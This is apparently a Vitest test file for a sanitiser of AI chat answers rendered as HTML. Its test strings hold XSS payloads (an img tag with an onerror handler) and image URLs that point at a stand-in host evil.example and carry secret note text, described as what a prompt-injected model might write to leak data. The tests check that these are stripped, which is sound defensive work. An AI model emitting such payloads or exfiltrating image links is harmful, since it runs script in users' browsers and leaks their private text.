// @vitest-environment jsdom
import { describe, expect, it } from "vitest";
import { renderAnswer } from "./renderAnswer";

function dom(md: string): HTMLElement {
  const el = document.createElement("div");
  el.innerHTML = renderAnswer(md);
  return el;
}

describe("renderAnswer (AI chat output)", () => {
  it("drops event handlers the model was tricked into writing", () => {
    const el = dom('Sure! <img src=x onerror="alert(1)">');
    const names = [...el.querySelectorAll("*")].flatMap((n) => [...n.attributes].map((a) => a.name));
    expect(names.filter((a) => a.startsWith("on"))).toEqual([]);
  });

  it("treats HTML inside [[links]] as text", () => {
    const el = dom('[[<img src=x onerror="alert(1)">]]');
    expect(el.querySelector("img")).toBeNull();
    expect(el.querySelector("a.ai-link")?.textContent).toContain("<img");
  });

  it("keeps [[links]] clickable", () => {
    const a = dom("see [[Neural Nets]]").querySelector("a.ai-link") as HTMLElement;
    expect(a.dataset.title).toBe("Neural Nets");
    expect(a.textContent).toBe("Neural Nets");
  });
});

describe("renderAnswer never loads remote images (a prompt-injected note could leak text through the URL)", () => {
  it("turns a markdown image into a plain link instead of an <img>", () => {
    const el = dom("Here: ![chart](https://evil.example/c.png?d=SECRET+NOTE+TEXT)");
    expect(el.querySelector("img")).toBeNull();
    const a = el.querySelector("a") as HTMLAnchorElement;
    expect(a.getAttribute("href")).toBe("https://evil.example/c.png?d=SECRET+NOTE+TEXT");
    expect(a.textContent).toContain("chart");
  });
  it("also catches raw <img> HTML and srcset", () => {
    const el = dom('<img src="https://evil.example/x.png"> <img srcset="https://evil.example/y.png 2x">');
    expect(el.querySelector("img")).toBeNull();
  });
});
